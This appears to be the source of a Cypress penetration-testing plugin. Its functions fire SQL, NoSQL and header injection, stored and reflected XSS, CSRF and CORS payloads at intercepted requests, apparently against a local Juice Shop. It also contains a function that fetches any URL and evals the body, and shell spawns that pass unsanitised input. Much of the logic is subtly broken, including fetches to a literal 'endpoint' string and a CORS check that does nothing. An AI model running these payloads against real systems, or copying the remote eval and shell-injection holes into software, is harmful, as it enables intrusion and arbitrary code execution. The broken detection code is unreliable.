/// <reference path="./index.d.ts" />
import fs from 'fs'
import process from 'process'
import os from 'os'
import fetch from 'node-fetch'
import {spawn} from "node:child_process"
import * as path from 'path';
import {sendGETRequest, sendPOSTRequest} from "./utils/requests";
import * as Puppeteer from 'puppeteer';
import {log} from "./utils/log";
import {Interception} from "cypress/types/net-stubbing";
import * as https from "https";
// declare variables for http status codes
const HTTP_SUCCESS = Array.from({ length: 100 }, (_, index) => index + 200);
const HTTP_REDIRECT = Array.from({ length: 100 }, (_, index) => index + 300);
const HTTP_ERROR = Array.from({ length: 100 }, (_, index) => index + 400);
const HTTP_SERVER_ERROR = Array.from({ length: 100 }, (_, index) => index + 500);
// declare variables for paths
const baseDir = path.join(process.cwd(), 'node_modules','cypress-pentest-plugin');
const logsPath = path.join(process.cwd(), 'logs', 'cypress.log');
const sqlPayloadPath = path.join(baseDir, 'lists', 'sqli.txt');
const nosqlPayloadsPath = path.join(baseDir, 'lists', 'nosql');
const secondOrderLogPath = path.join(baseDir, 'logs', 'test.log');
// import base = Mocha.reporters.base;

// const Cypress = require('cypress'); // might be false
/**
 * function that checks a specific endpoint for sql injection.
 * @module cypress-pentest-baseline
 * @param request Is the intercepted request
 * @param injectable The parameter that is injectable
 */
// TODO: add correct return type || Only one payload parameter per request?
// TODO: Implement enum for sql injection type: boolean, union, nosql, etc.
export async function checkEndpoint(request: any, injectable: any)
{
    const req = request.request
    const newRequestString = JSON.stringify(req, null, 2)
    // Logging since console.log does not work
    const newLog = `-------------------------------------\n Intercepted Request: ${newRequestString}\n`
    log(logsPath, newLog)
    let payloads: string[] = []
    if (fs.existsSync(sqlPayloadPath)) {
        const fileContent = fs.readFileSync(sqlPayloadPath, 'utf-8')
        payloads = fileContent.split('\n')
    } else {
        console.error('File does not exist:', logsPath)
        log(logsPath, `Error. Cannot find payloads list: ${sqlPayloadPath}`)
    }
    // create the requests with the post Parameters declared in the test file
    log(logsPath, `Method: ${req.method}\n`)
    log(logsPath, `Request Endpoint: ${req.url}\n`)
    for (let i = 0; i < payloads.length; i++) {
        // request parameters provided by the function call, e.g. username, password
        /**
        const reqParameters: object = {}
        postParams.forEach(function (param: string) {
            reqParameters[param] = payloads[i]
        })
        // assign the request parameters to the request body and header
        // TODO: outsource
        req.body = reqParameters
         **/
        // req.body[`${injectable}`] = payloads[i]
        req.body = {
            ...req.body,
            [injectable]: payloads[i],
        }
        const body = JSON.stringify(req.body)
        const header = JSON.stringify(req.headers)
        req.headers['content-length'] = body.length.toString()
        // send the request and wait for the response
        const response = await fetch(req.url, {
            method: req.method,
            body: '' + body,
            headers: req.headers
        })
        const data = await response.text()
        // log and print the response for debugging purposes
        if (HTTP_SUCCESS.includes(response.status)) {
            log(logsPath, `Loop iteration: ${i}\n`)
            log(logsPath, `Header of Request: ${header}\n`)
            log(logsPath, `Body of Request: ${body}\n`)
            log(logsPath, `Content length of new body: ${body.length.toString()}\n`)
            log(logsPath, `Response data: ${JSON.stringify(data, null, 2)}\n`)
            log(logsPath, `Response Status: ${JSON.stringify(response.status)}\n`)
            log(logsPath, `Response Text: ${JSON.stringify(response.statusText)}\n`)
            log(logsPath, '------------------------------------------------------\n')

        }
    }
    return null
}
/**
 * function that provides a sqlmap child process inside cypress. Parameters are inside a json object bc of cypress.
 * @param route: url to test
 * @param args: array of arguments for sqlmap, e.g. --dbs --level=3 --risk=3 --batch
 */
export async function sqlMap ( route, args ) {
    return await new Promise((resolve, reject) => {
        const homeDir = os.homedir() // utils directory where all the tools are stored.
        // clone the repo to the home directory before calling this function - otherwise it will fail
        const filePath = path.join(homeDir, 'sqlmap-dev', 'sqlmap.py')
        log(logsPath, '...starting SQL map...\n')
        if (args === '') {
            args = ['-h']
        }
        try {
            log(logsPath, `python3 ${filePath}  -u ${route}`)
            const child = spawn(`python3 ${filePath}  -u ${route}`, args, { shell: true }).on('error', function (err) { throw err })
            child.stdout.on('data', (data) => {
                log(logsPath, `sqlmap-data: ${data}\n`)
                // child.kill() // not sure if these are necessary
                // resolve(false)
            })
            child.on('exit', (code, signal) => {
                log(logsPath, `Child process exited with code ${code} and signal ${signal}\n`)
                child.kill()
                resolve(false)
            })
        } catch (e) {
            log(logsPath, `Error Message from Spawn: ${e}\n`)
            reject(e)
        }
    })
}

/**
 * spawnShell - DEPRECATED: use function sqlMap instead.
 * @param command: shell command to execute
 * @param args: arguments for the shell command
 */
export async function spawnShell ({ command, args }) {
    return await new Promise((resolve, reject) => {
        console.log(args)
        try {
            const child = spawn(command, args, { shell: true }).on('error', function (err) { throw err })
            child.stdout.on('data', (data) => {
                log(path.join(baseDir, 'logs', 'cypress,log'), `DATA EVENT LISTENER ${data}\n`)
                child.kill()
                resolve(false)
            })
            child.on('exit', (code, signal) => {
                log(path.join(baseDir, 'logs', 'cypress,log'), `Child process exited with code ${code} and signal ${signal}\n`)
                child.kill()
                resolve(false)
            })
        } catch (e) {
            log(path.join(baseDir, 'logs', 'cypress,log'), `Error Message from Spawn: ${e}\n`)
            reject(e)
        }
    })
}

/**
 * Tests SQLi using the header of a request
 * @param request: Intercepted request
 * @param headers: The fields in the header where payload shall be injected.
 */
// TODO: Implement payload list for header sql injection
export async function headerSQLi ({ request, headers }) {
    const endpoint = 'http://localhost:3000/rest/user/login'
    const req = request.request
    const body = JSON.stringify(req.body)
    for (let i = 0; i < req.headers.length; i++) {
        req.headers[`${headers[i]}`] = '\' or 1=1--'
    }
    // req.headers.cookie = 'this is a test'
    // req.headers['x-forwarded-for'] = '123.123.123.123'
    const reqJson = JSON.stringify(req, null, 2)
    const logMessage = `\n Request with new cookie: ${reqJson}\n`
    const pathToLog = baseDir + '\\logs\\sqli.log'
    log(pathToLog, logMessage)
    const response = await fetch(endpoint, {
        method: 'POST',
        body: '' + body,
        headers: req.headers
    })
    const data = await response.text()
    log(pathToLog, `Header of Request: ${JSON.stringify(req.headers)}\n`)
    log(pathToLog, `Response data: ${JSON.stringify(data)}\n`)
    log(pathToLog, `Response Status: ${JSON.stringify(response.status)}\n`)
    return null
}

/**
 * Tests for second order SQLi
 * @param request: the intercepted request
 */
export async function secondOrderAttack (request: any) {
    log(secondOrderLogPath, baseDir)

    const endpoint = 'http://localhost:3000/api/Users/'
    const pathToLog = baseDir + '\\logs\\sqli.log'
    log(pathToLog, '++++++++++++++++++++++++++ Second Order SQL Injection ++++++++++++++++++++++++++\n')
    const req = request.request // request-structure depending on api?
    const reqStringified = JSON.stringify(req, null, 2)
    const loggedMessage = `\n ++++Intercepted Request: ++++\n ${reqStringified}\n`
    log(pathToLog, loggedMessage)
    // req.body.email = 'admin@juice-sh.op\'--'
    req.request.body.email = 'baran_advisori@test.com'
    const body = JSON.stringify(req.request.body)
    const response = await fetch(endpoint, {
        method: 'POST',
        body: '' + body,
        headers: req.headers
    })
    const reqJSON = JSON.stringify(req, null, 2)
    const logMessage = `\n ++++Request with new username: ++++\n${reqJSON}\n`
    log(pathToLog, logMessage)
    const data = await response.text()
    log(pathToLog, `Response data: ${JSON.stringify(data, null, 2)}\n`)
    log(pathToLog, `Response Status: ${JSON.stringify(response.status)}\n`)
    return null
}

/**
 * Checks endpoint for noSQL-injection
 * @param request: the intercepted request
 */
export async function noSQLiCheck (request: any) {
    const req = request
    let payloads: string[] = []
    if (fs.existsSync(nosqlPayloadsPath)) {
        const fileContent = fs.readFileSync(nosqlPayloadsPath, 'utf-8')
        payloads = fileContent.split('\n')
        // fs.appendFileSync(path, `Payloads:\n ${payloads}`)
    } else {
        console.error('File does not exist:', logsPath)
        log(logsPath, `Error! File does not exist: ${sqlPayloadPath}`)
    }
    for (let i = 0; i < payloads.length; i++) {
        req.request.body = {
            email: payloads[i],
            password: payloads[i]
        }
        const body = JSON.stringify(req.request.body)
        const header = JSON.stringify(req.request.headers)
        req.request.headers['content-length'] = body.length.toString()
        const response = await fetch('endpoint', {
            method: 'POST',
            body: '' + body,
            headers: req.request.headers
        })
        const res = await response.text()
        if (HTTP_SUCCESS.includes(response.status)) {
            // Logging for debugging purposes.
            log(logsPath, `Loop iteration: ${i}\n`)
            log(logsPath, `Header of Request: ${header}\n`)
            log(logsPath, `Body of Request: ${body}\n`)
            log(logsPath, `Content length of new body: ${body.length.toString()}\n`)
            log(logsPath, `Response data: ${JSON.stringify(res, null, 2)}\n`)
            log(logsPath, `Response Status: ${JSON.stringify(response.status)}\n`)
            log(logsPath, `Response Text: ${JSON.stringify(response.statusText)}\n`)
            log(logsPath, '------------------------------------------------------\n')
        }
    }
    return null
}

/**
 * Function that analyzes the flags of the HTTP header regarding security
 * @param request: Intercepted request
 */
export async function checkHeaderFlags(request: Interception){
    const req = request.request; // request or request.request? try out
    if(req.headers){
        if(req.headers['content-security-policy']){
            // doSomething();
            console.log('CSP flag set!')
        } else {
            return false;
        }
        if(req.headers['x-content-type-options']){
            // doSomething();
            console.log('X-Content-Type-Options flag set!')
        } else {
            return false;
        }
        if(req.headers['x-frame-options']){
            console.log('X-Frame-Options flag set!')
        }
        if(req.headers['x-xss-protection']){
            console.log('X-XSS-Protection flag set!')
        }
        if(req.headers['strict-transport-security']){
            console.log('Strict-Transport-Security flag set!')
        }
        if(req.headers['referrer-policy']){
            console.log('Referrer-Policy flag set!')
        }
        if(req.headers['feature-policy']){
            console.log('Feature-Policy flag set!')
        }
        if(req.headers['expect-ct']){
            console.log('Expect-CT flag set!')
        }
        if(req.headers['cross-origin-embedder-policy']){
            console.log('Cross-Origin-Embedder-Policy flag set!')
        }

    }

    return null
}

/**
 * function that conducts a crlf injection by inserting several newline characters into the request
 * @param request: the intercepted request
 */
export async function crlfInjection(request: Interception){
    return null
}

/**
 * function that checks a component for XSS vulnerabilities
 * @param request the intercepted request that is used to alter the input
 * @param getParams the parameters that include the XSS payload
 */
// TODO: find way to check DOM for alert
export async function reflectedXSS(request: any, getParams: any){
    const dir = path.join(baseDir, 'lists', 'xss');
    const logDir = path.join(baseDir, 'logs', 'xss.log');
    const req = request // request.request or request?
    let payloads: string[] = []
    if (fs.existsSync(dir)) {
        const fileContent = fs.readFileSync(dir, 'utf-8')
        payloads = fileContent.split('\n')
    } else {
        console.error('File does not exist:', logsPath)
        log(logsPath, `Error. Cannot find payloads list: ${sqlPayloadPath}`)
    }
    //@ts-ignore
    const method = req.method;
    //@ts-ignore
    const endpoint = req.url;

    // build query string: ?param1=value1&param2=value2
    log(logDir, `Request: ${req}\n`)
    //@ts-ignore
    log(logDir, `Request Method: ${req.method}\n`)
    log(logDir, `Loop Endpoint: ${endpoint}\n`)
    for( let i = 0; i < payloads.length;i++){
        let payload = `?id=${payloads[i]}`;
        //@ts-ignore
        const response = await fetch(endpoint + payload, {
            method: req.method,
            headers: req.headers
        })
        const data = await response.text()
        if(data.includes(payload)){
            return -1;
        }
        if (method === 'GET') {
            const x = new URLSearchParams(getParams).toString;
            const response = await sendGETRequest(req.headers, endpoint, x)
            if(response.includes(payload)){
                log(logDir, `XSS vulnerability found in ${endpoint} with payload ${payload}\n`);
                return -1;
            } else {

            }
            return null;
        } else if (method === 'POST') {
            // const response = sendPOSTRequest(req.body, req.headers, endpoint)
            return null;
        }

    }
    return null
}

/**
 * function that checks for XSS in an alternative way, using puppeteer
 * @param url the URL to be tested.
 */
export async function altXSS(url: string) {
    // another approach for reflected XSS.


    const dir = path.join(process.cwd(), 'lists', 'xss');
    const logDir = path.join(process.cwd(), 'logs', 'xss.log');

    let payloads: string[] = []
    if (fs.existsSync(dir)) {
        const fileContent = fs.readFileSync(dir, 'utf-8')
        payloads = fileContent.split('\n')
    } else {
        console.error('File does not exist:', logsPath)
        log(logDir, `Error. Cannot find payloads list: ${dir}`)
    }
    for(let i = 0; i < payloads.length;i++){
        const browser = await Puppeteer.launch({ headless: true, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
        const page = await browser.newPage()
        const payload = url + payloads[i];
        // GET -> ?id=1 value von parameter ersetzen!
        let is_vulnerable = false
        log(logDir, `Payload ${i}: http://${payload}\n`)

        page.on("dialog", dialog =>{
            is_vulnerable = true
            dialog.accept()
        })

        await page.goto(payload)

        await browser.close()
        if(is_vulnerable){
            log(logDir, `XSS vulnerability found in ${url} with payload ${payload}\n`)
        }else{
            console.log("x");
        }
    }
    return null;
}

/**
 * function that checks for stored XSS.
 * @param request
 * @param url
 */
export async function storedXSS(request: any, url: string){
    // const dir = path.join(baseDir, 'lists', 'xss');
    const logDir = path.join(process.cwd(), 'logs', 'xss.log');
    log(logDir, "stored XSS testing underway...\n");
    const req = request
    const newRequestString = JSON.stringify(req, null, 2)
    // Logging since console.log does not work
    const newLog = `\n Intercepted Request: ${newRequestString}\n`
    log(logsPath, newLog)
    /*
      const payload = '<script>alert(\'xss\');</script>';
  const encodedPayload = encodeURIComponent(payload);

  // Send a POST request to the server with the malicious payload
  await axios.post(url, { data: encodedPayload });

  // Check if the page contains the alert box
  const response = await axios.get(url);
  const html = response.data;
  const regex = /<script>alert\('xss'\)/g;
  const matches = html.match(regex);
     */
    const payload = '<script>alert(\'xss\');</script>';
    const encodedPayload = encodeURIComponent(payload);
    const response = await fetch(url, {
        method: req.method,
        body: '' + encodedPayload,
        headers: req.headers
    })
    const data = await response.text()
    log(logDir, `Response data: ${JSON.stringify(data, null, 2)}\n`)
    const get = await fetch(url, {
        method: 'GET',
    })
    const html = await get.text();
    if(html.includes(payload)){
        log(logDir, `XSS vulnerability found in ${url} with payload ${payload}\n`);
        return -1;
    }
    return true;
}

/**
 * function that checks for CSRF by forging requests and simulating a user
 * clicking on the link.
 * @param request: The request that is to be forged
 */
export async function csrf(request: any){
    const logDir = path.join(baseDir, 'logs', 'csrf.log');
    log(logDir, "CSRF testing underway...\n");
    const req = request;
    const newRequestString = JSON.stringify(req, null, 2);
    const newLog = `Intercepted Request: ${newRequestString}\n`;
    log(logDir, newLog);
    req.query = {
        current: "baran",
        new: "csrf1",
        repeat: "csrf1"
    }
    const url_parts = req.url.split('?');
    let url = '';
    if(url_parts.length === 2){
        const query = new URLSearchParams(req.query).toString(); // change to params string, otherwise its unflexible
        url = url_parts[0]+'?'+query;
    } else {
        log(logDir, "Error: URL does not contain query parameters.\n");
    }
    log(logDir, `altered Request: ${JSON.stringify(req, null, 2)}\n`);
    const response = await fetch(url, {
        method: req.method,
        headers: req.headers
    })
    const data = await response.text();
    log(logDir, '------------------------------------------------------\n')
    log(logDir, `Response data: ${JSON.stringify(data, null, 2)}\n`)
    log(logDir, `Response Status: ${JSON.stringify(response.status)}\n`)
    log(logDir, `Response Text: ${JSON.stringify(response.statusText)}\n`)
    log(logDir, '------------------------------------------------------\n')
    log(logDir, "CSRF testing DONE!\n");
    return true;
}
export async function checkCORSVulnerability(url: string,
                                             method: string,
                                             request: Interception,
                                             origins: any,
                                             headers: any,
                                             ignore404:boolean){
    const baseDomain = request.request.url.split("//")[1].split("/")[0]; // request.url;
    const test_origins = ["https://evil.com", `http://sub.${baseDomain}`]; // .com on 2nd TD
    if(origins){
        for(let o in origins){
            test_origins.push(origins[o]);
        }
    }
    for(let o in test_origins){
        headers = {
            ...headers,
            "Origin": test_origins[o]
        }
    }
    if(headers){
        for(let h in headers){
            let value = headers[h];
            headers[h] = value;
        }
    }
    console.log("testing with xyz")
    try{
        console.log("_")
    }catch (e){
        console.log(e);
    }
}
export async function checkCert(website: string){
    const logDir = path.join(process.cwd(), 'logs', 'cert.log');
    /*    const options = {
        host: `https://crt.sh/?q=${website}&output=json`,
        port: 443,
        method: 'GET'
    }
    const req = https.request(options, (res) => {
       log(logDir, `Response: ${JSON.stringify(res.socket.getPeerCertificate(), null, 2)}\n)}`);
    });
    req.end()
    */
    const url = `https://crt.sh/?q=%.${website}&output=json`;
    const response = await fetch(url, {
        "body": null,
        "referrerPolicy": "strict-origin-when-cross-origin",
        "method": "GET"
    });
    const data = await response.json();
    log(logDir, `Response: ${JSON.stringify(data, null, 2)}\n)}`);
    return null;
}

export async function checkSubdomains(url, args){
    console.log("checking subdomains");
    return await new Promise((resolve, reject) => {
        const homeDir = os.homedir() // utils directory where all the tools are stored.
        const ffufLog = path.join(baseDir, 'logs', 'ffuf.log')
        const filePath = path.join(homeDir, 'ffuf', 'ffuf')
        log(ffufLog, '...starting ffuf...\n')
        if(args === ''){
            args = ['-h']
        }
        try {
            const child = spawn(`ffuf -u ${url} `).on('error', function (err) { throw err })
            child.stdout.on('data', (data) => {
                log(ffufLog, `ffuf-data: ${data}\n`)
                // child.kill() // not sure if these are necessary
                // resolve(false)
            })
            child.on('exit', (code, signal) => {
                log(ffufLog, `Child process exited with code ${code} and signal ${signal}\n`)
                child.kill()
                resolve(false)
            })

        } catch (e) {
            log(ffufLog, `Error Message from Spawn: ${e}\n`)
            reject(e);
        }
    })
}

export async function remoteCodeExecution(endpoint: string){
    console.log("checking for RCE");
    const url = new URL(endpoint);
    fetch(url).then(async (response) => {
        if (!response.ok) {
            throw new Error(`Failed to retrieve ${url}`);
        }
        const body = await response.text();
        try {
            eval(body);
        } catch (error) {
            console.warn("Error executing code", error);
        }
    }).catch((error) => {
        console.error("Error retrieving data", error);
    });
    return true
}

/* CONFIG FUNCTION */
export function configurePlugin(on: Cypress.PluginEvents){
    on('task', {
        checkEndpoint({ request, injectable }) {
            return checkEndpoint(request, injectable);
        },
        sqlMap({ route, args }) {
        return sqlMap(route, args);
        },
        headerSQLi({request, headers}) {
            return headerSQLi({request, headers});
        },
        reflectedXSS({request, getParams}) {
            return reflectedXSS(request, getParams);
        },
        csrf({request}) {
            return csrf(request);
        },
        altXSS({url}){
            return altXSS(url);
        },
        checkCert({website}){
            return checkCert(website);
        }
    });
}